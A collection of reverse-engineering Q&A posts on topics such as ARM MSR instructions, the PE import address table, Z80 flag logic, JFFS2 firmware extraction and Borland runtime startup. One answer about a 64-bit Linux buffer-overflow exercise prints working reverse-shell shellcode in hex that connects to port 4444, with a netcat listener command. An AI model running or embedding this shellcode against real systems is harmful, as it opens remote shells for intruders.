BYTE foo[0x100];
Mystruct *blah;
int s1;
PSTR s2;
result = ReadProcessMemory(where,howmuch,destination,VerifiactionPointer)
blah = (MyStruct *)destination;
s1 = blah-&gt;someint;
s2 = blah-&gt;somestring;
</code></pre>

<p>Memory you see will always contain hex bytes that are indistinguishable from one another. It is like clay in the hands of a potter. </p>

<p>Only the artisan can give it form. Clay by itself can never become a statue or a finely crafted teapot.</p>
","2792"
"ARM: understanding MSR/MRS instructions","645","","<p>While reversing a bootloader, i have a lot of msr/mrs instructions, but i cannot find in the arm documentation the meaning of the parameters.</p>

<p>For example in IDA i have things like :</p>

<pre><code>MSR             #4, c6, c0, #4, X0
</code></pre>

<p>or</p>

<pre><code>MSR             #5, #0
</code></pre>

<p>Could someone explain how to parse these instructions and point me to the right documentation ?</p>

<p>Maybe there is a script or plugin to automate the process ?</p>
","<p>The presence of X0 and the use of MSR to access a system register tells me that you are on 64-bit ARM / ARMv8.</p>

<p>The reference manual for this architecture can be found <a href=""https://developer.arm.com/docs/ddi0487/a/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile"" rel=""nofollow noreferrer"" title=""here"">here</a></p>

<p>Section C6 describes the instructions.  You can find <code>MSR (register)</code> at C6.2.131 and <code>MSR (immediate)</code> at C6.2.130. These both access system control registers.</p>

<p>Section D7 describes the generic ARMv8 system control registers. In D7.2.34 you can find the information that your <code>MSR</code> instruction is accessing the <code>HPFAR_EL2</code> register which contains the ""Hypervisor IPA Fault Address.""  (see the table at the bottom of the section that shows the values of op0/op1/CRn/Cm/op2 that correspond to this register.)</p>

<p>The two instructions you show above are therefore -</p>

<p><code>MSR HPFAR_EL2, X0</code></p>

<p><code>MSR PSTATEField_SP, #0</code></p>
","14630"
"How to debug an IDA Pro plugin built with the C++ IDASDK","645","","<p>I'm building an IDA Pro plugin (not a script) using the C++ SDK. On top of the frustration added by the lack of a proper API documentation, I cannot find a good way to debug my plugin.</p>

<p>I've tried printing messages to the output window of IDA Pro. </p>

<pre><code>...
msg(""Everything OK up to point 1\n"");
...
msg(""Everything OK up to point 2\n"");
...
</code></pre>

<p>However, whenever my plugin hits an error state, IDA Pro crashes before I get a chance to read the messages that my plug-in printed in the output window.</p>

<p>While searching for a solution I stumbled upon the <a href=""http://wingware.com/doc/howtos/idapython"" rel=""nofollow"">Wingware Python IDE</a> which can be used to debug IDAPython. The drawbacks however are that it is not free and I am not developing the plugin in python.</p>

<p>One obvious thing to try is writing to a text file instead of writing to the IDA output window. However, that is not handy debugging. Isn't there a better way to debug an IDA Pro plugin built with C++ SDK?</p>
","<p>Most modern IDE's allow you to specify an executable to launch when debugging, you should specify your ida executable. Or otherwise, try to attach to the running IDA process.</p>

<p>When you put a breakpoint in the run() function of your plugin, your IDE will stop at run,  and you can singlestep, etc from there.</p>

<p>Also you if you enable 'break on exception' your IDE will probably figure out if the exception was in your plugin, and load the right source file for you.</p>
","6178"
"XMPP clubs in league of legends","645","","<p>Hopefully I'm asking this at the right place. League of legends recently added the option to join a club. Clubs still use the <a href=""https://en.wikipedia.org/wiki/XMPP"" rel=""nofollow"">XMPP protocol</a> just like before for their public chat rooms: <a href=""http://leagueoflegends.wikia.com/wiki/User_blog:Sevenix/Connecting_to_the_LoL_chat_using_XMPP"" rel=""nofollow"">XMPP for public rooms</a>.</p>

<p>For public chat rooms, you connect through the ""lvl.pvp.net"" server.</p>

<p>For the private clubs' chat rooms, the server is now ""pgc.pvp.net"".</p>

<p>My problem is that I can't figure out how to find the room address to connect to a club. The clubs are private rooms. Only someone that is part of the club can view and chat in the club. Unlike for a public chat room, where the address is simply: <strong><em>pu~""Channel name hashed and no capital letters""</em></strong>, a club address is a UUID and therefore, unlike public rooms, it's impossible to figure out the room address from the club name. </p>

<p>Riot is fine with people connecting to the XMPP server from outside apps, but they haven't provided an easy way to find the UUID for a club room.</p>

<p>How do I find what it is for my club?</p>
","<p>There are two possibilities:</p>

<ol>
<li>The League of Legends client uses an embedded algorithm to <a href=""https://en.wikipedia.org/wiki/Injective_function"" rel=""nofollow"">injectively</a> map a club name to a club UUID.</li>
<li>The League of Legends client sends the club name to the server and receives the club UUID in response.</li>
</ol>

<p>Either way, you'd be able to see what UUID-channel is eventually joined by the League of Legends client by sniffing the XMPP traffic, as @guntram-blohm suggested.</p>
","12491"
"Getting pydbg working on windows 10","643","","<p>I downloaded the paimei tool and dropped the pydbg package files inside .../paimai/pydbg then installed paimei but I can't seem to get pydbg to work. I keep getting an error with pydasm when trying to import pydbg. Any tips?</p>

<p>I have python 2.7 on windows 10.</p>
","<p>Are you sure you installed <code>pydasm</code> properly? <code>pydasm</code> cannot be automatically installed by <code>pip</code>, so most installations of dependent software will just assume it is installed when in their own installation process as well as when executing.</p>

<p><a href=""https://github.com/OpenRCE/sulley/wiki/Windows-Installation"" rel=""nofollow"">This</a> explains how <code>libdasm</code> and <code>pydasm</code> can be compiled and installed on windows. <a href=""http://www.securityaddicted.com/2014/02/07/howto-setup-debugging-reverse-engineering-environment-python-tools/"" rel=""nofollow"">This</a> provides a prebuilt package and shows how to properly install it, together with additional scripts you seem to be using.</p>

<p>It is not too clear from your question, but it might be the case that the missing package is <code>pydbg</code>, depends on how I interpret your text.
If that's the case, the second aforementioned link also describes how <code>pydbg</code> can be installed, and additionally google is your friend.</p>

<p>If these links does not work, providing the output of <code>pip freeze</code> will be a good start of additional info.</p>
","13767"
"Are there any open source test suites for testing how well a disassembler performs?","641","","<p>A key tool in reverse engineering is a good disassembler, so to ensure that a disassembler is performing properly, are there any good test suites available for use to test the correctness of a disassembler?  Are these architecture specific, or can they be configured to work across multiple object architectures?  A good test should include checking the more obscure architecture instructions and malformed portable execution files.</p>

<p>Here is <a href=""http://sourceware.org/cgi-bin/cvsweb.cgi/src/gas/testsuite/gas/i386/?cvsroot=src"">one specifically for i86</a> that I have seen.  Are there any that are modular across architectures?</p>
","<p>There is a paper called ""<a href=""http://roberto.greyhats.it/pubs/issta10-nversion.pdf"" rel=""nofollow"">N-version Disassembly: Differential Testing of x86 Disassemblers</a>"" (PDF) by  Roberto Paleari, Lorenzo Martignoni, Giampaolo Fresi Roglia, and Danilo Bruschi which compares several x86 disassemblers in a formal fashion.</p>

<p>To quote the papers abstract:</p>

<blockquote>
  <p>The output of a disassembler is used for many different purposes
  (e.g., debugging and reverse engineering). Therefore, disassemblers
  represent the ﬁrst link of a long chain of stages on which any
  high-level analysis of machine code depends upon. In this paper we
  demonstrate that many disassemblers fail to decode certain
  instructions and thus that the ﬁrst link of the chain is very weak. We
  present a methodology, called N-version disassembly, to verify the
  correctness of disassemblers, based on differential analysis</p>
</blockquote>

<p>Not sure if this is slightly off topic to your question but may be of interest to you.</p>
","83"
"Decompile binary executable into c / asm code by emulation, is it possible?","641","","<p>I am thinking on a decompilation method which uses the runtime behavior of the binary executable to extract usable compilation data. Analysing the runtime behavior (i.e. trapping after every cpu instruction and check what it does), we could get a lot of additional infos, like:</p>

<ul>
<li>we could differentiate between the static constant data (""<code>.text</code>"") and the binary asm</li>
<li>additional information, what type of data is in which register or global / local variable (pointers, floats and integers)</li>
<li>where the cpu instructions are starting</li>
<li>from the stack behavior we could get highly useful heuristics, where are the functions / internal functions and how long / what type of parameters they have.</li>
</ul>

<p>On my opinion, maybe even the holy grail, the recompilable source code wouldn't be so far away.</p>

<p>Is it possible? Does any tool / software already exist which is capable to do this?</p>
","<p>This problem is linked to the halting problem on a Turing machine (which is known to be undecidable). </p>

<p>Approaching decompilation through emulation suppose that you have to run through all the branches of the software at least once, and reaching all possible program points cannot be guaranteed if you have to go through a (potentially) infinite loop.</p>

<p>Yet, this is a theoretical problem that you unlikely find in real life (except if it has been planted here intentionally to prevent the full exploration through emulation).</p>

<p>But, in a more practical perspective, exploring all paths can be done only if you can easily run through all the path at runtime, which is not the case when the user is required to solve a challenge (possibly on-line) such as giving a password whose hash is stored in the program or prove that he posses a private key by signing a message and returning it to the software.</p>
","10848"
"Java - Decipher encrypted classes in a jar file","640","","<p>I have a couple of classes that are encrypted. The class loader must decrypt these before executing in the JVM.</p>

<p>The question is, how and where?</p>

<p>What can I do to understand who is responsible to decrypt these classes before deploy?</p>
","<p>Find which of the visible classes implement <code>java.lang.ClassLoader</code>.</p>

<p>Then you can look at its <code>findClass</code> and <code>findResource</code> implementation.</p>
","11747"
"Need help extracting JFFS2 filesystem from .img firmware binary","640","","<p>I'm trying to access the filesystem of the EA2750's firmware. Here is a link to download it <a href=""http://downloads.linksys.com/downloads/firmware/FW_EA2750_1.1.7.172380_prod.img"" rel=""nofollow noreferrer"">http://downloads.linksys.com/downloads/firmware/FW_EA2750_1.1.7.172380_prod.img</a>. The problem is it is an <code>img</code> file and I'm not exactly sure how to go about trying to access it. </p>

<p>Here is the <code>binwalk</code> signature scan output:</p>

<pre><code>$ binwalk FW_EA2750_1.1.7.172380_prod.img 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0x143599, created: 2016-05-04 16:53:12, image size: 1935492 bytes, Data Address: 0x80000000, Entry Point: 0x8000C2F0, data CRC: 0x57C547E2, OS: Linux, CPU: MIPS, image type: OS Kernel Image, compression type: lzma, image name: ""Linksys EA2750 Router""
64            0x40            LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 5956532 bytes
1966080       0x1E0000        JFFS2 filesystem, little endian
</code></pre>
","<p>Use the command <code>binwalk -Me FW_EA2750_1.1.7.172380_prod.img</code></p>

<p>This will recursively extract all files and even extract the JFFS2 filesystem into the folder <code>_FW_EA2750_1.1.7.172380_prod.img.extracted/jffs2-root/fs_1</code></p>

<p><strong>Edit:</strong> As to your jefferson issue, I believe you need to install cstruct 1.0. So.. <a href=""https://github.com/sviehb/jefferson/issues/9"" rel=""nofollow noreferrer"">https://github.com/sviehb/jefferson/issues/9</a></p>
","15696"
"Android - Analyzing complex hash algorithm","639","","<p>An APK I'm working on uses some sort of algorithm to generate a hash which is sent along with an HTTP request. I want to figure out how the algorithm works.</p>

<p>Decompiling the APK to Java is of no help at all because it is much too obfuscated and there is clearly a ton of jumping around to separate files, it's impossible to follow.</p>

<p>Analysing the SMALI is much more helpful, but still very difficult to follow due to the use of many different files, and also the generic/meaningless function names.</p>

<p>I have IDA Pro but I don't have the Hex rays decompiler. There is also an extremely small amount of tutorials on using IDA Pro with Android. Is IDA Pro useless here? Smali is definitely easier to understand than the raw machine code instructions.</p>

<p>What are my options for analysing and figuring out this algorithm?</p>

<p>Thank you for your suggestions</p>
","<p>IDA PRO is useful for analyzing native code. Hex-Rays decompiler decompiles ARM and x86/x64, not java. For your specific case IDA pro would be useful if this hashing algorithm would be compiled in native code and called with JNI like interface.</p>

<p>For your specific case IDA is almost useless because almost all of its advantages related to native code analysis. </p>
","11754"
"How to add new button to an executable?","636","","<p>My target exe file has a button. It will display a webpage when the button is clicked on. I used OllyDBG to disassemble this file. My questions are:</p>

<ol>
<li>How can I find the url of this webpage? I have searched text strings, but found nothing.</li>
<li>I want to create a new button with the same function as this previous button. How can I make this work?</li>
</ol>
","<ol>
<li><p>It may be generated dynamically, loaded from a file, be there, but obfuscated or encrypted, in the original .exe, or something else. The easiest way to get the url is probably using <a href=""http://www.telerik.com/fiddler"" rel=""nofollow"">Fiddler</a>, as you're on windows. Listening to network communication with <a href=""https://www.wireshark.org/"" rel=""nofollow"">wireshark</a> or a similar program might work as well, but if the application uses TLS, encryption will get in the way, which fiddler can usually work around.</p></li>
<li><p>This is where it becomes complicated. Adding a new button to a dialog box might work with a <a href=""http://www.resedit.net/"" rel=""nofollow"">resource editor</a>, if the application uses standard windows gui elements. If the application uses a different GUI framework, you're out of luck. Once you have the button, you need to change the button handler of the dialog box to recognize your new button id and react accordingly. This includes writing a new routine, finding a bunch of unused bytes in the code segment of your .exe to place it in, or enlarging the code segment or creating a new segment for your code, patching the original button handler to call your routine if the new button ID is detected, and hoping you don't break anything in the process. Considerable experience is required for this to work, so if you're a beginner with RE, you probably have to learn a lot before attempting this.</p></li>
</ol>
","6791"
"what is IAT? and how to find the end of the IAT in packed exe?","635","","<p>I recently started to study RE in my free time. I started to look at lena151
free tutorials and now I'm on packers/protectors.</p>

<p>Now i reached to the part that he show how to manually find the end of IAT
and he said ""you see, we can easy spot the end of the of the IAT, it's on
 493854..."" </p>

<pre><code>0049380C  D0 E9 5F 73 C0 4A 65 73 70 68 65 73 A0 61 66 73  ׀י_sְJesphes afs
0049381C  50 C4 64 73 D0 66 65 73 40 6B 66 73 00 00 00 00  Pִds׀fes@kfs....
0049382C  C0 41 7E 75 10 0A 7A 75 00 00 00 00 00 F3 64 75  ְA~u.zu.....ףdu
0049383C  00 00 00 00 10 F4 00 77 00 6A 01 77 10 69 01 77  ....פ.w.jwiw
0049384C  00 00 00 00 6E 17 00 10 00 00 00 00 6B 65 72 6E  ....n.....kern
0049385C  65 6C 33 32 2E 64 6C 6C 00 00 00 00 44 65 6C 65  el32.dll....Dele
0049386C  74 65 43 72 69 74 69 63 61 6C 53 65 63 74 69 6F  teCriticalSectio
0049387C  6E 00 00 00 4C 65 61 76 65 43 72 69 74 69 63 61  n...LeaveCritica
</code></pre>

<p>Now I don't udnerstand how he know where the end of the IAT just from looking
on the dump?</p>

<p>Also, I didn't completely understood what is IAT, 
any help will be great :-)</p>
","<blockquote>
  <p>I didn't completely understood what is IAT, any help will be great :-)</p>
</blockquote>

<p>The IAT is the Import Address Table. It's an an array of pointers to statically-imported API function addresses. The IAT entries gets populated at runtime.</p>

<p>The format of the IAT is typically as follows, with all functions from a particular DLL grouped together, with a null-pointer separating each DLL's list of function addresses:</p>

<p><code>&lt;pointer to DLL #1's function A&gt;, &lt;pointer to DLL #1's function B&gt;, &lt;pointer to DLL #1's function C&gt;, 0x00000000, &lt;pointer to DLL #2's function D&gt;, &lt;pointer to DLL #2's function E&gt;, ..., 0x00000000</code></p>

<p>Note that this format isn't required, but it's the most common format.</p>

<blockquote>
  <p>Now I don't udnerstand how he know where the end of the IAT just from looking on the dump?</p>
</blockquote>

<p>I highlighted each IAT function below (with mspaint), with a different color for each DLL grouping. At virtual address <code>0x0049380C</code> we see the function addresses <code>0x735FE9D0</code>, <code>0x73654AC0</code>, etc. You can tell that they're likely from the same DLL because:</p>

<ol>
<li>There's no null-pointer separating them, and</li>
<li>They're all in the same address range (<code>0x735F0000</code> - <code>0x7366FFFF</code>)</li>
</ol>

<p><a href=""https://i.stack.imgur.com/s75RT.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/s75RT.png"" alt=""IAT""></a></p>

<p>The DWORD at <code>0x00493850</code> (after the null-pointer at <code>0x0049384C</code>) is <code>0x1000176E</code>, so you can look up that address in your debugger and see if there's DLL code loaded at that address. If not, <code>0x0049384C</code> would mark the end of the IAT. If so, <code>0x00493854</code> would mark the end of the IAT since the data at <code>0x00493858</code> is the beginning of an ASCII string and clearly not a valid function pointer.</p>
","11272"
"One shellcode works, one doesn't - an issue with exploiting a 64 bit linux binary","633","","<p>I'm working on exploiting a simple 64 bit linux binary. I got control of RIP by exploiting a buffer overflow and using a jmp rsp to get control of the progrm.</p>

<p>However, I'm having trouble with the shellcode piece. I'm not savvy enough to write my own, so I've been using some I found online. The shellcode needs to get me a reverse shell on port 4444.</p>

<p>Just for testing though, I tried some basic shellcode.</p>

<p>Works - <a href=""http://shell-storm.org/shellcode/files/shellcode-806.php"" rel=""nofollow"">http://shell-storm.org/shellcode/files/shellcode-806.php</a></p>

<p>Doesn't work - <a href=""https://www.exploit-db.com/exploits/35587/"" rel=""nofollow"">https://www.exploit-db.com/exploits/35587/</a></p>

<p>The shellcode in the first link works. The one in the second did not.</p>

<p>I stepped through the program and each instruction lines up. However, after the last syscall, the program continues to execute the stack instead of exiting the thread.</p>

<p>I could really use help on it, I've been stuck on it all day.</p>
","<p>I've tested these two shellcodes and they both work.</p>

<p>I think that you're missing the point of the second one. It's said :</p>

<blockquote>
  <p>NOTE: This C code connects to 127.0.0.1:4444</p>
</blockquote>

<p>Meaning it's trying to connect to port 4444 on localhost (127.0.0.1). If nobody is listening on that port, then it won't connect and just trying to execute whatever is after you syscall.</p>

<p>Try to execute it again, but this time you need to lauch some process waiting for a connection on port 4444 <strong>before</strong> executing your shellcode, say <em>netcat</em></p>

<pre><code>$ nc -lp 4444 -vv 
listening on [any] 4444 ...
</code></pre>

<p>And <strong>then</strong>, when you execute your shellcode</p>

<pre><code>./execshellcode64 ""\x31\xf6\xf7\xe6\xff\xc6\x6a\x02\x5f\x04\x29\x0f\x05\x50\x5f\x52\x52\xc7\x44\x24\x04\x7d\xff\xfe\xfe\x81\x44\x24\x04\x02\x01\x01\x02\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05""
</code></pre>

<p><em>nectat</em> warns you (because of -vv meaning verbose) that there was a connection on that port</p>

<pre><code> $ nc -lp 4444 -vv
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost.localdomain [127.0.0.1] 40234
</code></pre>

<p>That's the connection initiated by your shellcode.</p>

<p>Hope this helps !</p>

<p><strong>Note</strong> : <em>execshellcode64</em> is just a personnal program I made for testing purpose. It's not actually a real command.</p>
","9508"
"How was the Zero Flag implemented on Z80 ALU?","630","","<p>Z80 was a popular 8-bit processor with a 4-bit ALU.</p>

<p><img src=""https://i.stack.imgur.com/5tueN.png"" alt=""Z80 ALU""></p>

<p>Implementing a zero flag for a register should be straight forward, it would be a logical <code>NOR</code> of all the bits on the register.</p>

<p><img src=""https://i.stack.imgur.com/RG7f4.png"" alt=""Gigantic NOR""></p>

<p>Something like that would work for a small number of inputs. As for a 64-bit processor you cannot make one gigantic <code>NOR</code> gate with 64 inputs. The fan-in would be too high. 8 transistors would be in series. The circuit capacitance would be high thus slowing down everything else.</p>

<p>I can see some other options.</p>

<ul>
<li>The zero flag could be generated directly from the 8-bit result using 2 level logic.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/tLlMR.png"" alt=""two level logic"">
<img src=""https://i.stack.imgur.com/OOodj.png"" alt=""two level logic""></p>

<ul>
<li>The zero flag could be generated directly from the 8-bit result using 3 level logic.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/2xBFt.png"" alt=""three level logic""></p>

<ul>
<li>The zero flag could be generated from each nibble and then put together, like if there was a ""half""-zero flag. The result for the lower would be saved using a flip-flop while waiting for the high nibble result to be calculated.</li>
</ul>

<p><img src=""https://i.stack.imgur.com/anAW5.png"" alt=""Nibble""></p>

<p><a href=""http://www.righto.com/2013/09/the-z-80-has-4-bit-alu-heres-how-it.html"" rel=""nofollow noreferrer"">Ken Shirriff</a> wrote a nice article about reverse engineering the Z80 ALU. However when it comes to the zero flag he states:</p>

<blockquote>
  <p>Not shown in the block diagram are the simple circuits to compute parity, <strong>test for zero</strong>, and check if a 4-bit value is less than 10. These values are used to set the condition flags.</p>
</blockquote>

<p>So, although they are simple circuits I would like to know exactly how they were implemented and if they used any of the implementations proposed above or something else completely different.</p>
","<p><strong>Well if you want to know how it was done exactly</strong></p>

<p>Then download the <strong>Z80 die shot</strong> of model you want to investigate, crop the <strong>ALU</strong> part and identify all the gates you can until you dig to <strong>Zero flag</strong> your self (sorry for indirect answer).</p>

<p><strong>Here my Z80 ALU post processed die shot</strong></p>

<p><img src=""https://i.stack.imgur.com/rkIpx.png"" alt=""Z80 ALU""></p>

<ul>
<li>white - metal</li>
<li>green - poly-Si</li>
<li>red   - dopped-Si (diffusion)</li>
<li>Gray  - conductive joints between layers</li>
</ul>

<p>Try to identify all gates and buses you can (and mark them to the image)</p>

<p><img src=""https://i.stack.imgur.com/ORk25.png"" alt=""Z80 ALU labeled""></p>

<p>When found familiar structure like <strong>Wire OR, (N)OR</strong> cascade, ... then you will know for sure. Just try to find the basic components like:</p>

<p><img src=""https://i.stack.imgur.com/yZf5a.png"" alt=""Components""></p>

<p>form the circuit schematics and make some sense of it.</p>
","8773"
"Reverse engineer 4-bit CRC in LG IR packet","629","","<p>I am reverse engineering IR protocol of LG air conditioner. AC generally send the whole current state of remote on each key press. Data sent is 28 bits long, last 4 bits seem to be the checksum. I have already tried <code>reveng</code>, but without luck.</p>

<p>Bits 14-16 are mode of operation (heat/cool/fan/auto). Bits 17-20 are temperature + 15 degrees, bits 22-24 are fan speed and bits 25-28 seem to be 4-bit checksum.</p>

<p>Here are sample values:</p>

<pre><code>100010000000100001000101 0001
100010000000100001010101 0010
100010000000100001100101 0011
100010000000100010000100 0100
100010000000100011000101 1001
100010000000100011010101 1010
100010000000100011110101 1100
100010000000000011000101 0001
100010001100000000000101 0001
</code></pre>

<p>In the last two, only the position of <code>11</code> changed, but checksum stayed the same. How is that checksum calculated?</p>
","<p>This seems to be a checksum, just as you state in your question, not a CRC as mentioned in the header.</p>

<p>Group the values into blocks of 4 bits, add them, ignore overflow (in these examples, ignore overflow means subtract 32):</p>

<pre><code>1000 1000 0000 1000 0100 0101  0001 8+8+0+8+4+5=33  1
1000 1000 0000 1000 0101 0101  0010 8+8+0+8+5+5=34  2
1000 1000 0000 1000 0110 0101  0011 8+8+0+8+6+5=35  3
1000 1000 0000 1000 1000 0100  0100 8+8+0+8+8+4=36  4
1000 1000 0000 1000 1100 0101  1001 8+8+0+8+12+5=41 9
1000 1000 0000 1000 1101 0101  1010 8+8+0+8+13+5=42 10
1000 1000 0000 1000 1111 0101  1100 8+8+0+8+15+5=44 12
1000 1000 0000 0000 1100 0101  0001 8+8+0+0+12+5=33 1
1000 1000 1100 0000 0000 0101  0001 8+8+12+0+0+5=33 1
</code></pre>
","9415"
"Android bytecode verifier","628","","<p>One of the things that makes Java bytecode (.class) so easy to reverse engineer is that the JVM's verifier ensures that bytecode can always be disassembled via linear sweep. Instructions have to be consecutive starting at offset 0, and you can't jump into the middle of an instruction.</p>

<p>However <a href=""http://www.dexlabs.org/blog/bytecode-obfuscation"">this post</a> implies that Dalvik does not do such bytecode verification. The authors do all the usual x86 shenanigans like jumping into the middle of an instruction, which is apparently allowed. Is this true? Do Android VMs actually perform any kind of loadtime bytecode verification? If not, why?</p>
","<p>this is not entirely true. Dalvik bytecode will also be verified on the device, but this happens during installation time, not runtime. A verified and optimized version of the dex file will be stored on the system, protected by file system permission (you cannot change it afterwards unless you have rooted your device).</p>

<p>The trick that was used in the blog post is that you can set a specific flag within the class header which tells the verifier to skip this class.</p>
","2811"
"Determining communication protocol","627","","<p>I have two chips that are connected using two lines. One appears to be the clock line (50% duty cycle), but it doesn't have to be (sometimes constant high). The other line appears to be totally random, but still digital. It might be data.</p>

<p>There is a third line between the chips, but it appears to be for something else - it's on a way slower speed and is on another place on the PCB. It also doesn't use a pull-up, while the other two do.</p>

<p>How can I find out what protocol (I2C, SPI, RS232, ...) is being used on the lines, if any standard?</p>
","<p>My guess is that the protocol is standard, using a non standard protocol between two devices involves using bitbanging which is not very useful.
Let's assume then that the protocol is standard.
It's not SPI, SPI needs 4 lines To work. I2C needs two, RS232 needs only two.
I don't know what the third line job is, maybe it's used for trigerring/synchronization between the chips.</p>

<p>What now ? I would open the data sheet of the microcontroller and see what protocols the chips supports, usually if they are new 32bit SOC, they all support CAN, SPI, USART, etc.
Then I would check the pinout of the corresponding lines, to see to which ports they are connected on the chip. This will point you to the exact protocol used.</p>

<p>Then connect a logic analyzer, such as this <a href=""http://www.saleae.com/logic/"" rel=""nofollow"">one</a>, which is bundled with a software that can dumo the data transfered acordding to the protocol.</p>
","1604"
"Offset Calculation for a Branch Instruction Thumb","627","","<p>I did find this link: <a href=""https://reverseengineering.stackexchange.com/questions/9094/offset-calculation-for-branch-instruction-in-arm?newreg=644a4b2d707a476496570137fcb31e37"">Offset calculation for branch instruction in ARM</a></p>

<p>Which was quite helpful but also confusing for me. I tried few ways to get it working with my offsets but failed.</p>

<p>What I wanted to do, was create a BL instruction from 0x52F4D6 to 0x5BF368.</p>

<p>At 0x52F4D6 I wanted to write BL sub_5BF368 but how do I get the correct hex code (thumb) for it?</p>

<p>Thank you!</p>
","<p>You can get this from the ARM manual; for example from the version linked at the link you found, <a href=""https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf"" rel=""nofollow"">https://ece.uwaterloo.ca/~ece222/ARM/ARM7-TDMI-manual-pt3.pdf</a>.</p>

<p>First, a quick calculation <code>5BF358-52F4D6</code> yields <code>8FE82</code>, so you see you have more than 12 bits, and need to use the long branch format in 5.19, which splits your <code>BL</code> into two instructions. The section says ""The branch offset must take account of the prefetch operation, which causes the PC to be 1 word (4 bytes) ahead of the current instruction"", so the offset you need is from 4 bytes behind <code>52F4D6</code> - <code>52F4DA</code>, which means the offset for the instructions - the value you want to add to <code>PC</code> is <code>8FE7E</code>.</p>

<p>The first part of the instruction shifts its partial offset left by 12 bits, and adds this to PC. The instruction format is <code>1111HXXXXXXXXXXX</code> in binary, with <code>H=0</code>, so <code>F000+XXXX</code> in hex. What you want to add to PC in this step is <code>8F000</code>, so the opcode for this instruction is <code>F0 8F</code>.</p>

<p>The second part shifts its partial offset left by one bit (remember thumb instructions are aligned to 16 bit, so the last bit of an offset is always 0, so it doesn't have to be represented in the hex opcode), and it has <code>H=1</code>, so the opcode is <code>F800+XXXX</code>. What you want to add in this step is <code>E7E</code>. Shift that right by one bit to get <code>73f</code>, and add to your opcode to get <code>FF 3F</code>.</p>

<p>So, your BL instruction is <code>F08F FF3F</code>.</p>

<p>To confirm this, create an assembly program, assemble it, and check the result:</p>

<pre><code>.thumb
.arch armv7a
.syntax unified
.align 2
.org    0x52F4D6
bl  sub_5BF368
.org    0x5BF358
sub_5BF368:
</code></pre>

<hr>

<pre><code>arm-linux-gnueabi-as -o y.o y.s
arm-linux-gnueabi-objdump -s y.o | grep -v ""00000000 00000000 00000000 00000000""
.....
 52f4d0 00000000 00008ff0 3fff0000 00000000  ........?.......
....
</code></pre>

<p>Remember words are byte-swapped due to little-endianness, and you'll find your <code>F08F FF3F</code> opcode there.</p>
","12489"
"Unusual x86 switch statement?","627","","<p>I have come across the following x86 (Built with some version of Visual Studio AFAIK) switch statement:</p>

<pre><code>0x1009E476  cmp edx, 0x3B
0x1009E479  jnz switch_statement

switch_statement:
0x1009E591  movzx ecx, byte [indirect_table+edx]
0x1009E598  jmp dword [table1+ecx*4]

indirect_table:
0x1009E7AB  db 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07
            db 0x07, 0x07, 0x06, 0x8B, 0xFF

table1:
0x1009E7B8  dd ptr code1
            dd ptr code2
            dd ptr code3
            dd ptr code4
            dd ptr code5
            dd ptr code6
            dd 0x00000000 
0x1009E7D4  dd 0x01060600, 0x06020606, 0x06060306, 0x06060606 ; Note: nothing directly references this data.
            dd 0x06040606, 0x06060606, 0x06060606, 0x06060606
            dd 0x06060606, 0x06060606, 0x06060606, 0x06060606
            dd 0x06060606, 0x06060606, 0x06060606, 0x06060606
            dd 0x06060606
</code></pre>

<p>No index in the <code>indirect_table</code> will end up referencing any of the 6 pointers in <code>table1</code>. Index 6 will dereference a null pointer, index 7 will dereference <code>0x01060600</code> and indexes <code>0x8B</code> and <code>0xFF</code> will end up dereferencing garbage. So everything will end up access violating.</p>

<p>So perhaps this is a compiler optimization, the data at table1 following the 6 code pointers and 1 null pointer looks like an indirect table, and coincidentally all indexes are suitable for this switch statement (0-6). While the binary has no references to this data, if <code>EBX</code> was known to be <code>0x29</code> or upwards, it would reference into this. The compiler may have decided <code>EBX</code> will not be <code>0</code>-<code>0x29</code> so moved the indirect table location backwards to line things up correctly. What then is the role of <code>cmp edx, 0x3B</code> in this?</p>

<p><strong>Is this a compiler code gen issue, a compiler optimization, or have I grossly misunderstood the code?</strong> </p>

<p>If an optimization, any supporting reading material would be greatly appreciated.</p>
","<p>Either there is a check somewhere before, or the compiler knows otherwise that <code>edx</code> is not less than 41 (0x29). 0x3B is probably handled by a single switch label, so the compiler added this check to avoid the double memory lookup (or maybe there's an actual <code>if</code> before <code>switch</code> in the source).</p>

<p>The table at 0x1009E7D4 is used to retrieve the jump table entry index - Visual C++ compiler always puts the indirect table after the jumps. 0x1009E7AB is likely a part of the previous switch's indirect table. And <code>8B FF</code> is <code>mov edi, edi</code>, used here for alignment.</p>

<p>This specific optimization (no subtraction for zero-indexing) seems to be pretty rare; I think I've only seen it in Windows DLLs which often use PGO and other tricks to achieve the last few percents of performance.</p>
","2700"
"Borland C++ runtime startup","626","","<p>I'm trying to reverse engineer an ages-old game compiled with Borland C++ in 1995. So far, I have found out that start @0x401000 passes to __startup in cw3220.dll (which apparently is Borland's C++ runtime dll) the following:</p>

<ol>
<li><p>pointer to the begin of a list of global static constructors (<code>{ char flag0; char flag1; void* fun}</code>)</p></li>
<li><p>pointer to end of said list</p></li>
<li>pointer to begin of a list of destructors (as above)</li>
<li>pointer to end of dtor list</li>
<li>int flag - GUI app or not (should __startup call <code>main(argc,argv,env)</code> or <code>WinMain(hInstance,hPrevInstance,lpCmdLine,nShowCmd)</code>)</li>
<li>unknown int flag1</li>
<li>pointer to entry function</li>
<li>pointer to a function which IDA has automagically named <code>matherr</code></li>
<li>pointer to a function <code>matherrl</code></li>
<li>unknown int flag2</li>
<li>unknown int flag3</li>
</ol>

<p>Is there any documentation available which tells the meaning of flag1/2/3 in the info struct, flag0/1 in the ctor list entries and how Borland C++ handles exceptions - functions using classes always call <code>__InitExceptBlock</code>, but I never see checks for exceptions after function calls, how is try/catch handled?</p>
